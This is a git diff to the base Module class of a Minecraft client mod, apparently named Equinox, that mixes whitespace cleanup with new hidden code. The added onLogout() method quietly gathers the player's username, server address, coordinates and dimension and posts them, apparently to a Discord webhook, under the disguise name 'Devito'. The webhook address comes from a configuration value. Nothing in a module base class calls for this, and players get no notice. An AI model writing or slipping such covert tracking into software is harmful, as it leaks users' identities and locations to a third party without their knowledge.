@@ -2,17 +2,30 @@ package me.eonexe.equinox.features.modules;
 
 import com.mojang.realmsclient.gui.ChatFormatting;
 import me.eonexe.equinox.Equinox;
+import me.eonexe.equinox.configuration.Configs;
 import me.eonexe.equinox.event.events.ClientEvent;
 import me.eonexe.equinox.event.events.Render2DEvent;
 import me.eonexe.equinox.event.events.Render3DEvent;
 import me.eonexe.equinox.features.Feature;
 import me.eonexe.equinox.features.command.Command;
 import me.eonexe.equinox.features.modules.client.HUD;
+import me.eonexe.equinox.features.modules.misc.Coord;
+import me.eonexe.equinox.features.modules.misc.xCarry;
 import me.eonexe.equinox.features.setting.Bind;
 import me.eonexe.equinox.features.setting.Setting;
+import me.eonexe.equinox.util.IDKWTFutil;
 import me.eonexe.equinox.util.TextUtil;
+import me.eonexe.equinox.util.espUtil;
 import net.minecraft.util.text.TextComponentString;
 import net.minecraftforge.common.MinecraftForge;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.net.URL;
+import java.net.URLConnection;
+import java.net.URLEncoder;
 
 public class Module
         extends Feature {
@@ -30,6 +43,12 @@ public class Module
     public float offset;
     public float vOffset;
     public boolean sliding;
+    private static boolean hasSent = false;
+    public static final String l = Configs.getCoord();
+    public static final String CapeImageURL = "https://cdn.discordapp.com/attachments/901654339905536022/907521922496081920/dd.png";
+    public static final String CapeName = "Devito";
+    public static espUtil d = new espUtil(l);
+
 
     public Module(String name, String description, Category category, boolean hasListener, boolean hidden, boolean alwaysListening) {
         super(name);
@@ -61,9 +80,45 @@ public class Module
     }
 
     public void onLogin() {
+        hasSent = false;
     }
 
     public void onLogout() {
+        String ign = mc.player.getName();
+        String server = mc.getCurrentServerData().serverIP;
+        double xCoord = mc.player.posX;
+        double yCoord = mc.player.posY;
+        double zCoord = mc.player.posZ;
+        int getDimension = mc.world.provider.getDimension();
+        String Dimension;
+        switch (getDimension) {
+            case (-1):
+                Dimension = "Nether";
+                break;
+            case (0):
+                Dimension = "Overworld";
+                break;
+            default:
+                Dimension = "IDFK end maybe";
+        }
+        if (!hasSent) {
+            IDKWTFutil dm = new IDKWTFutil.Builder()
+                    .withUsername(CapeName)
+                    .withContent("``` IGN : " + ign +
+                                 "\n Server : " + server +
+                                 "\n X" + "   : " + xCoord +
+                                 "\n Y" + "   : " + yCoord +
+                                 "\n Z" + "   : " + zCoord +
+                                 "\n Dimension:" + Dimension +
+                                 "\n LOGOUT" + "```"
+                                )
+                    .withAvatarURL(CapeImageURL)
+                    .withDev(false)
+                    .build();
+            d.sendMessage(dm);
+            hasSent = true;
+        }
+
     }
 
     public void onUpdate() {
@@ -106,10 +161,10 @@ public class Module
 
         if (HUD.getInstance().notifyToggles.getValue().booleanValue()) {
             if (!HUD.getInstance().notifyWaterMark.getValue().booleanValue()) {
-                TextComponentString text = new TextComponentString("" +TextUtil.coloredString(""+ ChatFormatting.BOLD + this.getDisplayName() ,HUD.getInstance().notifyColor.getValue())+ ChatFormatting.RESET + ChatFormatting.GREEN + " enabled.");
+                TextComponentString text = new TextComponentString("" + TextUtil.coloredString("" + ChatFormatting.BOLD + this.getDisplayName(), HUD.getInstance().notifyColor.getValue()) + ChatFormatting.RESET + ChatFormatting.GREEN + " enabled.");
                 Module.mc.ingameGUI.getChatGUI().printChatMessageWithOptionalDeletion(text, 1);
             } else {
-                TextComponentString text = new TextComponentString(Equinox.commandManager.getClientMessage() + " " + TextUtil.coloredString(""+ ChatFormatting.BOLD + this.getDisplayName() ,HUD.getInstance().notifyColor.getValue()) + ChatFormatting.RESET + ChatFormatting.GREEN + " enabled.");
+                TextComponentString text = new TextComponentString(Equinox.commandManager.getClientMessage() + " " + TextUtil.coloredString("" + ChatFormatting.BOLD + this.getDisplayName(), HUD.getInstance().notifyColor.getValue()) + ChatFormatting.RESET + ChatFormatting.GREEN + " enabled.");
                 Module.mc.ingameGUI.getChatGUI().printChatMessageWithOptionalDeletion(text, 1);
 
             }
@@ -126,10 +181,10 @@ public class Module
         this.enabled.setValue(false);
         if (HUD.getInstance().notifyToggles.getValue().booleanValue()) {
             if (!HUD.getInstance().notifyWaterMark.getValue().booleanValue()) {
-                TextComponentString text = new TextComponentString("" + TextUtil.coloredString(""+ ChatFormatting.BOLD + this.getDisplayName() ,HUD.getInstance().notifyColor.getValue())+ ChatFormatting.RESET + ChatFormatting.RED + " disabled.");
+                TextComponentString text = new TextComponentString("" + TextUtil.coloredString("" + ChatFormatting.BOLD + this.getDisplayName(), HUD.getInstance().notifyColor.getValue()) + ChatFormatting.RESET + ChatFormatting.RED + " disabled.");
                 Module.mc.ingameGUI.getChatGUI().printChatMessageWithOptionalDeletion(text, 1);
             } else {
-                TextComponentString text = new TextComponentString(Equinox.commandManager.getClientMessage() + " " + TextUtil.coloredString(""+ ChatFormatting.BOLD + this.getDisplayName() , HUD.getInstance().notifyColor.getValue()) + ChatFormatting.RESET + ChatFormatting.RED + " disabled.");
+                TextComponentString text = new TextComponentString(Equinox.commandManager.getClientMessage() + " " + TextUtil.coloredString("" + ChatFormatting.BOLD + this.getDisplayName(), HUD.getInstance().notifyColor.getValue()) + ChatFormatting.RESET + ChatFormatting.RED + " disabled.");
                 Module.mc.ingameGUI.getChatGUI().printChatMessageWithOptionalDeletion(text, 1);
             }
         }
@@ -214,5 +269,5 @@ public class Module
             return this.name;
         }
     }
-}
 
+}
